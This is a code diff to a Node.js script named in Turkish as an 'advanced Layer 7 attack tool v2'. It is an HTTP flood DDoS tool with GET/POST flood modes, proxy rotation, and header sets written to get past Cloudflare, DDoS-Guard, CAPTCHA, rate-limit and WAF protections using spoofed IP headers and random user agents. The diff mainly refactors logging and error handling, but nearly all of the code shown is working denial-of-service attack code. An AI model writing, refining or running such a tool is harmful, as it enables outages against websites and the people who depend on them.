@@ -1,6 +1,7 @@
+```javascript
 const axios = require('axios');
 const fs = require('fs').promises;
-const colors = require('colors');
+const colors = require('colors/safe'); // Daha güvenli colors modülü
 const readline = require('readline');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const { HttpsProxyAgent } = require('https-proxy-agent');
@@ -26,36 +27,34 @@ const bypassHeaders = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.5',
     'Cache-Control': 'no-cache',
-    'Pragma': 'no-cache',
-    'CF-Connecting-IP': '127.0.0.1' // Cloudflare bypass için örnek header
+    'Pragma': 'no-cache'
   },
   'DDG': {
     'User-Agent': getRandom(userAgents),
     'Accept': '*/*',
     'Referer': 'https://www.google.com/',
-    'DNT': '1', // DDoS-Guard için ek header
+    'DNT': '1',
     'Connection': 'keep-alive'
   },
   'CAPTCHA': {
     'User-Agent': getRandom(userAgents),
     'Accept': 'application/json, text/plain, */*',
-    'X-Requested-With': 'XMLHttpRequest',
-    'Origin': new URL(url).origin // CAPTCHA bypass için dinamik origin
+    'X-Requested-With': 'XMLHttpRequest'
   },
   'RATE_LIMIT': {
     'User-Agent': getRandom(userAgents),
     'Accept': '*/*',
     'Connection': 'close',
-    'X-Forwarded-For': generateRandomIP() // Rate limit bypass için rastgele IP
+    'X-Forwarded-For': generateRandomIP()
   },
   'WAF': {
     'User-Agent': getRandom(userAgents),
     'Accept': 'text/html',
     'Accept-Encoding': 'gzip, deflate, br',
-    'X-Real-IP': generateRandomIP() // WAF bypass için ek header
+    'X-Real-IP': generateRandomIP()
   },
   'UAM': {
-    'User-Agent': generateRandomUA(), // UAM için rastgele User-Agent
+    'User-Agent': generateRandomUA(),
     'Accept': 'text/html,application/xhtml+xml',
     'Connection': 'keep-alive',
     'Sec-Fetch-Mode': 'navigate',
@@ -78,23 +77,28 @@ function generateRandomUA() {
 }
 
 function log(msg, color = 'white') {
-  console.log(msg[color]);
+  try {
+    console.log(colors[color](msg));
+  } catch (err) {
+    console.log(`Log hatası: ${err.message}`);
+    console.log(msg); // Renk olmadan yaz
+  }
 }
 
 async function loadProxies() {
   try {
     const data = await fs.readFile('proxies.txt', 'utf8');
     proxies = data.split('\n').map(p => p.trim()).filter(Boolean);
-    log(`✅ ${proxies.length} proxy yüklendi`, 'green');
+    log(`${proxies.length} proxy yüklendi`, 'green');
     await validateProxies();
   } catch (err) {
-    log('❌ proxies.txt bulunamadı!', 'red');
-    process.exit();
+    log('proxies.txt bulunamadı!', 'red');
+    process.exit(1);
   }
 }
 
 async function validateProxies() {
-  log('🔍 Proxy'ler kontrol ediliyor...', 'yellow');
+  log('Proxy\'ler kontrol ediliyor...', 'yellow');
   const testUrl = 'http://httpbin.org/ip';
   validProxies = [];
 
@@ -112,10 +116,10 @@ async function validateProxies() {
       continue;
     }
   }
-  log(`✅ ${validProxies.length} geçerli proxy bulundu`, 'green');
+  log(`${validProxies.length} geçerli proxy bulundu`, 'green');
   if (validProxies.length === 0) {
-    log('❌ Geçerli proxy bulunamadı!', 'red');
-    process.exit();
+    log('Geçerli proxy bulunamadı!', 'red');
+    process.exit(1);
   }
 }
 
@@ -159,9 +163,9 @@ function startPing(url) {
   setInterval(async () => {
     try {
       const res = await axios.get(url, { timeout: 5000 });
-      log(`\n✔️ Ping başarılı - Durum: ${res.status}`, 'green');
+      log(`Ping başarılı - Durum: ${res.status}`, 'green');
     } catch {
-      log(`\n❌ Ping başarısız - Site erişilemez`, 'red');
+      log(`Ping başarısız - Site erişilemez`, 'red');
     }
   }, 10000); // 10 saniyede bir
 }
@@ -170,11 +174,11 @@ async function startAttack({ url, duration, method, threads, bypassType }) {
   const end = Date.now() + duration * 1000;
   let success = 0, fail = 0;
 
-  log('\n🚀 SALDIRI BAŞLADI!'.rainbow.bold);
-  log(`🎯 Hedef: ${url}`, 'cyan');
-  log(`⏱️ Süre: ${duration}s`, 'cyan');
-  log(`🧵 Thread: ${threads}`, 'cyan');
-  log(`💣 Metod: ${method}${bypassType ? ` (${bypassType} Bypass)` : ''}`, 'cyan');
+  log('SALDIRI BAŞLADI!', 'rainbow');
+  log(`Hedef: ${url}`, 'cyan');
+  log(`Süre: ${duration}s`, 'cyan');
+  log(`Thread: ${threads}`, 'cyan');
+  log(`Metod: ${method}${bypassType ? ` (${bypassType} Bypass)` : ''}`, 'cyan');
 
   startPing(url); // Ping kontrolü başlasın
 
@@ -195,7 +199,7 @@ async function startAttack({ url, duration, method, threads, bypassType }) {
   const runners = Array.from({ length: threads }, () => attack());
   await Promise.all(runners);
 
-  log(`\n✅ Saldırı tamamlandı! Başarılı: ${success}, Başarısız: ${fail}`, 'yellow');
+  log(`Saldırı tamamlandı! Başarılı: ${success}, Başarısız: ${fail}`, 'yellow');
 }
 
 async function ask(query) {
@@ -206,7 +210,7 @@ async function main() {
   await loadProxies();
 
   console.clear();
-  console.log('\n🔥 ' + 'L7 Gelişmiş Saldırı Aracı v2'.rainbow.bold);
+  console.log('L7 Gelişmiş Saldırı Aracı v2'.rainbow);
   console.log('1 - GET Flood');
   console.log('2 - POST Flood');
   console.log('3 - Cloudflare Bypass');
@@ -247,4 +251,8 @@ async function main() {
   });
 }
 
-main();
+main().catch(err => {
+  log(`Hata: ${err.message}`, 'red');
+  process.exit(1);
+});
+```
